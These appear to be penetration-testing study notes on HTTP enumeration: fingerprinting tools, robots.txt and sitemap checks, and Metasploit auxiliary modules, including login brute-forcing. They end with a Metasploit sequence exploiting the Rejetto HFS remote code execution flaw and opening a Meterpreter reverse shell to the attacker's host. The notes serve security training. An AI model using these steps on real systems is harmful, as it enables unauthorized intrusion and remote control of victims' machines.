**HTTP** (HyperText Transfer Protocol) is a protocol used for transferring data on the web. It operates in a client-server model, where the client (e.g., a browser) makes requests to the server for resources like web pages. 

## Wappalyzer
`Wappalyzer` is a web browser extension or add-on that provides information about the technologies used on a website. It helps identify the software frameworks, content management systems (CMS), e-commerce platforms, server software, analytics tools, and other technologies powering a website.

## whatweb
`WhatWeb` is a tool used to identify technologies and frameworks running on a website. It detects information such as web server type, CMS, programming languages, and plugins.

```bash
whatweb example.com
```

## robots.txt
The `robots.txt` file can be interesting from an offensive perspective because it often contains disallowed paths or directories that the website owner doesn’t want search engines to index. These paths might reveal sensitive files, hidden directories, or areas of the website that could serve as potential attack vectors.

Example:

- Access http://example.com/robots.txt → May reveal entries like /admin/ or /backup/ that can be explored further for vulnerabilities.

## sitemap.xml
The `sitemap.xml` file provides a list of all the important pages on a website, intended to help search engines index them efficiently.

**Example:**

- Access `http://example.com/sitemap.xml` → Displays URLs of pages, often including hidden or unlinked paths.

## Enumeration using Metasaploit
**Metasploit** offers several modules for enumerating HTTP services on a target.

- **Identify Web Server Version**: Use `http_version` to identify the version of the web server running on the target system. 
- **Enumerate Directories**: Use `dir_scanner` to scan for common directories on the web server (e.g., `/admin`, `/login`, `/uploads`). 
- **Analyze HTTP Headers**: Use `http_headers` to enumerate HTTP headers and potentially discover misconfigurations or hidden server details (e.g., `X-Powered-By`, `Server`).
- **Identify Web Server Methods**: Use `http_methods` to identify the allowed HTTP methods on the server (e.g., `PUT`, `DELETE`). This helps assess potential attack vectors for file uploads or deletion.
- **Scan for Sensitive Files**: Use `files_dir` to enumerate files on the server (e.g., `.bak`, `.php`, `.txt`). This helps discover sensitive files or backup files.
- **Brute Force HTTP Login**: Use `http_login` to perform brute force attacks against login pages or basic HTTP authentication, using username and password lists.
- **Check Robots.txt for Sensitive Information**: Use `robots_txt` to retrieve the `robots.txt` file and find hidden directories or files that should not be indexed by search engines but may still be accessible.
- **Identify SSL/TLS Version**: Use `ssl_version` to determine the SSL/TLS version supported by the server. This helps identify insecure protocols or misconfigurations.
- **Scan for Web Vulnerabilities**: Use `http_vuln` to scan for common web application vulnerabilities, such as SQL Injection, Cross-Site Scripting (XSS), and Local File Inclusion (LFI).
- **Enumerate HTTP Authentication Methods**: Use `http_enum` to identify different types of HTTP authentication mechanisms, such as digest authentication or basic auth.
- **Fingerprint Web Technologies**: Use `http_fingerprint` to identify the web application framework, web server, and other technologies being used, helping in vulnerability mapping.


```bash
use <module_name>
set RHOSTS <target IP>
run
```

## Rejetto HFS
Rejetto HFS (HTTP File Server) is a file-sharing application for Windows that provides an easy way to share files over HTTP. However, older versions of HFS (like 2.3 and 2.3c) are vulnerable to Remote Code Execution (RCE). Metasploit can exploit this vulnerability effectively.

#### Exploitation

```bash
msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOST <target_ip>
set RPORT <target_port>
set TARGETURI /
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
set LPORT <your_port>
run
```